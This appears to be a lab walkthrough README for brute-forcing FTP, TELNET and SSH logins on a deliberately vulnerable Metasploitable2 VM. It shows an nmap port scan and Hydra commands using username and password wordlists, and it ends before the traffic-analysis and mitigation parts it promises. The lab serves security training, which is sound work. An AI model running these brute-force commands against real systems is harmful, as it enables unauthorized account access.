# 🧪 Network Protocol Vulnerability Lab - Walkthrough

## 📌 Objective

The purpose of this lab is to simulate brute force attacks against common network services (**FTP**, **TELNET**, **SSH**, and **HTTP**), analyze the security of these protocols, capture and inspect network traffic, and propose security mitigations.

---

## 📂 Lab Environment Setup

- **Attacker VM:** Kali Linux 2024.4
- **Target VM:** Vulnerable Linux VM (Metasploitable2 / custom)

---

## 🛠️ Tools Used

- **Hydra**
- **Burp Suite** (Community or Pro)
- **Wireshark** / **tcpdump**
- **Wordlists** (e.g., `rockyou.txt`, `userlist.txt`)

---

# 🧾 Task 1: Enumerate the Target

## 🎯 Goal
Identify valid usernames on the target VM.

---

## 🛠️ Commands Used

```bash
nmap -p 21,23,22,80 <target-ip> 
```
![image](https://github.com/user-attachments/assets/01080065-ba49-40d4-9e90-c1ca80dd6306)

---

# 🔐 Task 2: Brute Force Attacks

## 2.1 FTP / TELNET / SSH

Use Hydra to perform brute force attacks against the services FTP, TELNET, and SSH.

---

## 🛠️ Example Hydra Commands

```bash
# Brute force FTP login
hydra -L userlist.txt -P passlist.txt ftp://<target-ip>

# Brute force TELNET login
hydra -L userlist.txt -P passlist.txt telnet://<target-ip>

# Brute force SSH login
hydra -L userlist.txt -P passlist.txt ssh://<target-ip>
```
